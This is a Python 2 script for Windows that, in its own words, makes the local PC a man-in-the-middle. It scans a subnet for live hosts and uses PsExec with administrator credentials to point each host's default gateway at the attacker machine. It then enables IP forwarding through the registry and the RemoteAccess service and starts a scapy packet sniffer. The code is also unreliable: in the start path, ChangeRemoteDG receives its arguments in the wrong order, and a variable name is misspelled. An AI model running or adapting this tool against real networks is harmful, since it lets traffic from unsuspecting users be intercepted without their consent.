'''
This module will scan the local network based on user input.
After listing all the live hosts of the network it will change the Defualt Gateway
of each machine to the D.G the user machine local IP.
'''

##############IMPORT TABLE##########
from _winreg import *
import os
import time
import socket
import subprocess
import sys
####################################

if sys.argv[1] == "--help":
    print("To start the script type: python ChangeDG.py --start")
    print("To use the rollbackoption type: python ChangeDG.py --rollback")
    raw_input("Press ENTER to EXIT")
    sys.exit(1)


def Decorator(f):
    '''
    This is a decorator function meant to decorate the errors of function objects.
    :param f: function object
    :return: the f function return statement or the error is raised
    '''


    def wrapper(*args, **kwargs):
        result = 0
        try:
            if len(args) > 0:
                result = f(*args, **kwargs)
                log("###################")
                log("Success in executing %s(%s)" % (GetFunctionName(f), str(args)))

            else:  # The function does not get any arguments
                result = f()
                log("###################")
                log("Success in executing %s" % (GetFunctionName(f)))

        except Exception as err:
            log("###################")
            log("Error in %s --> Error code is: %s" % (GetFunctionName(f), str(err)))

        return result

    return wrapper


def GetFunctionName(f):
    '''
    :param f: Function type
    :return: String rep of the function name
    '''

    return f.__name__


def log(message, log_type='+'):
    if not os.path.exists('C:\\DGScript_logs.txt'):
        with open("C:\\DGScript_logs.txt", 'wb') as file:
            file.write('Log file Creation' + '\n')
            file.close()
    with open("C:\\DGScript_logs.txt", 'a+') as file:
        file.write(message + '\n')
        file.close()


@Decorator
def install(package):
    '''
    Open a new process and try to install the new lib -> pip install 'package'
    :param package: External lib to install | String
    '''
    subprocess.call([sys.executable, "-m", "pip", "install", package])

#######EXTERNAL LIBS TABLE#####
install("psutil")
import psutil
install("scapy")
from scapy.all import *
###############################


def GetLocalIP():
    print "Finding local machine's IP..."
    time.sleep(4)
    HOSTNAME = socket.gethostname().lower()
    try:
        LOCAL_IP = socket.gethostbyname(HOSTNAME)
    except socket.gaierror:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # doesn't even have to be reachable
        s.connect(('"8.8.8.8"', 1))
        LOCAL_IP = s.getsockname()[0]

    print "Local IP found! result is -> %s" % str(LOCAL_IP)
    return LOCAL_IP


@Decorator
def SearchFilePath(name, path):
    '''
    Find a file in the system path
    :param name: String -> File name
    :param path: system path, Example -> C:\
    :return: String -> The path to the file (e.g C:\path\file)
    '''
    print("Trying to search for %s..." % name)
    time.sleep(2)
    for root, dirs, files in os.walk(path):
        if name in files and "Recycle" not in root:
            print "Found the file in %s" % os.path.join(root, name)
            return os.path.join(root, name)


@Decorator
def GetLocalDG():
    os.system("ipconfig > c:\\ipconfig.txt")
    time.sleep(3)
    with open("C:\\ipconfig.txt") as fp:
        line = fp.readline()
        countlines = 1
        while line:
            line = fp.readline()
            countlines  += 1
            if "Default Gateway" in line:
                print line
    result = raw_input("Please insert the Default Gateway you see on screen: ")
    return result


@Decorator
def ExcludedIP():
    user_decision = raw_input("Do you want to exclude some addresses from the scan? (Y/N)")
    user_decision = user_decision.lower()
    if user_decision == "n" or user_decision == "no":
        return False
    elif user_decision == "y" or user_decision == "yes":
        excluded = str(raw_input("Please state the addresses you want to exclude in the form of a list, " \
                             "i.e 1.1.1.1, 2.2.2.2, 3.3.3.3 etc: "))
        excluded = excluded.split(",")
        return excluded

@Decorator
def NetworkScan(start="10.2.0.1", stop = "10.2.0.255"):
        print("Starting scanning the network...")
        time.sleep(4)
        start = start.split('.')
        stop = stop.split('.')
        network = start[0] + '.' + start[1] + '.' + start[2] + '.'
        start_address_of_scan = int(start[3])
        end_address_of_scan = int(stop[3])
        excluded_address = ExcludedIP()

        live_hosts = []

        for ip in range(start_address_of_scan, end_address_of_scan):
            address = network + str(ip)
            if excluded_address and address in excluded_address:
                print("%s is an excluded address" % address)
            else:
                if (CheckIfHostIsAlive(address)):
                    time.sleep(2)
                    live_hosts.append(address)

        return live_hosts


def CheckIfHostIsAlive(addr):
    print("Checking %s" % addr)
    time.sleep(1)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    result = s.connect_ex((addr, 135))
    if result == 0:
        print("host %s is up" % addr)
        return 1
    else:
        return 0


@Decorator
def ChangeRemoteDG(remote_pc_ip, remote_DG, PsExecPath, username='', password=''):
    print("Changing the DG of %s to be --> %s ..." % (remote_pc_ip,remote_DG))
    if username is '' and password is '':
        os.system('%s \\\\%s netsh int ip set address "local area connection" static %s 255.255.255.0 %s 1'
              % (PsExecPath, remote_pc_ip, remote_pc_ip, remote_DG))
    else:
        os.system('%s \\\\%s -u %s -p %s'
                  ' netsh int ip set address "local area connection" static %s 255.255.255.0 %s 1'
                  % (PsExecPath, remote_pc_ip, username, password, remote_pc_ip, remote_DG))


@Decorator
def TurnOnRoutingService(service):
    service_handle = GetService(service)
    if service_handle and service_handle['status'] == 'running':
        print("Service is running")
    else:  #  service in not running
        print "Starting %s serivce" % service
        time.sleep(2)
        os.system("sc config %s start= auto" % service)
        time.sleep(5)
        os.system("net start %s" % service)
        time.sleep(3)
        print("Service %s was started successfully" % service)


def TurnOffRoutingService(service):
    service_handle = GetService(service)
    if service_handle and service_handle['status'] == 'running':
        os.system("net stop %s" % service)
        time.sleep(5)
        print("Service was stopped")
    else:  #  service in not running
        print("The service %s is not running" % service)


def GetService(name):
    service = None
    try:
        service = psutil.win_service_get(name)
        print("Found the service - %s. Generating service handle" % str(name))
        time.sleep(3)
        service = service.as_dict()
    except Exception as ex:
        # raise psutil.NoSuchProcess if no service with such name exists
        print(str(ex))

    return service


@Decorator
def AddStaticRoute(network, DG):
    print("Adding static route, making the local PC the MITM...")
    time.sleep(4)
    network = network.split(".")
    network = network[0] + '.' + network[1] + '.' + network[2] + '.0'
    os.system("route add %s MASK 255.255.255.0 %s" % (network, DG))


@Decorator
def SnifferStart():
    print("Creating packet sniffer...")
    time.sleep(2)
    with open("C:\\sniffer.py","w") as file:
        file.write("from scapy.all import * \n")
        file.write("import time \n")
        file.write('print("Sniffer is ON!") \n')
        file.write("time.sleep(1) \n")
        file.write('sniff(filter="ip", prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%\\n}"))')
    time.sleep(2)

    print("Starting Sniffer in 10 seconds! Make Sure all browser are turned off"
          " (or else there will be too much packets)!")
    time.sleep(10)

    os.system("start python C:\\sniffer.py")


@Decorator
def ValidateDGChange(ip, PsExecPath, username='', password=''):
    print("Validating the local PC is the MITM")
    time.sleep(4)
    print("Forcing remote PC to execute ping to 8.8.8.8")
    time.sleep(4)
    if username is '' and password is '':
        os.system('%s \\\\%s "ping 8.8.8.8 -n 2"' % (PsExecPath, ip))
    else:
        os.system('%s \\\\%s -u %s -p %s "ping 8.8.8.8 -n 2"' % (PsExecPath, ip, username, passowrd))


def ClearScreen():
    '''
    Clear the current screen from any output that is displayed
    '''
    _ = os.system('cls')


def main():

    ClearScreen()

    print("This script is used to make the local pc as man-in-the-middle!")
    live_hosts = 0
    PsExecPath = SearchFilePath("PsExec.exe", "C:\\users")
    LOCAL_IP = GetLocalIP()
    LOCAL_DG = GetLocalDG()
    username = raw_input("Please write the username used to log to remote pc (like administrator). If the remote" \
                         "Pc does not have a username configured just press ENTER: ")
    password = raw_input("Please write the password used to log to remote pc." \
                         "Pc does not have a username configured just press ENTER: ")

    ClearScreen()

    if sys.argv[1] == "--start":
        print("Starting the script!")
        time.sleep(3)

        print("Trying to enable routing function in the local pc...")
        time.sleep(3)

        try:
            key = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
            data = 0x00000001
            KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_ALL_ACCESS)
            SetValueEx(KeyHandle, "IPEnableRouter" ,0, REG_DWORD, data)
            print("The pc can now be used as man-in-the-middle")
        except Exception as err:
            print("Error in enabling the router function! Error code -> %s" % str(err))

        TurnOnRoutingService("RemoteAccess")

        AddStaticRoute(LOCAL_IP,LOCAL_DG)

        first_ip = raw_input("Please write the FIRST ip to start the scan from (default is 10.2.0.1): ")
        last_ip = raw_input("Please write the LAST ip to stop scan at (default is 10.2.0.255): ")
        live_hosts = NetworkScan(first_ip, last_ip)

        for host in live_hosts:
            ChangeRemoteDG(host, LOCAL_IP, username,password, PsExecPath)


        print("Checking if the change was successful")
        time.sleep(3)
        SnifferStart()
        time.sleep(15)
        for host in live_hosts:
            ValidateDGChange(host, PsExecPath, username, password)

        log("removing the sniffer file")
        os.remove("c:\\sniffer.py")
        os.remove("c:\\ipconfig.txt")


    elif sys.argv[1] == "--rollback":
        print("Rolling back the old configuration!")
        time.sleep(5)

        print("Trying to disable routing function in the local pc...")
        time.sleep(3)

        try:
            key = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
            data = 0x00000000
            KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_ALL_ACCESS)
            SetValueEx(KeyHandle, "IPEnableRouter", 0, REG_DWORD, data)

        except Exception as err:
            print("Error in disabling the router function! Error code -> %s" % str(err))

        TurnOffRoutingService("RemoteAccess")
        time.sleep(3)

        print("routing function was turned off in the local pc!")
        time.sleep(5)

        first_ip = raw_input("Please write the FIRST ip to start the scan from (default is 10.2.0.1): ")
        last_ip = raw_input("Please write the LAST ip to stop scan at (default is 10.2.0.255): ")
        live_hosts = NetworkScan(first_ip, last_ip)

        for host in live_hosts:
            ChangeRemoteDG(host, LOCAL_DG, PsExecPath, username, password)


if __name__ == "__main__":
    exit(main())


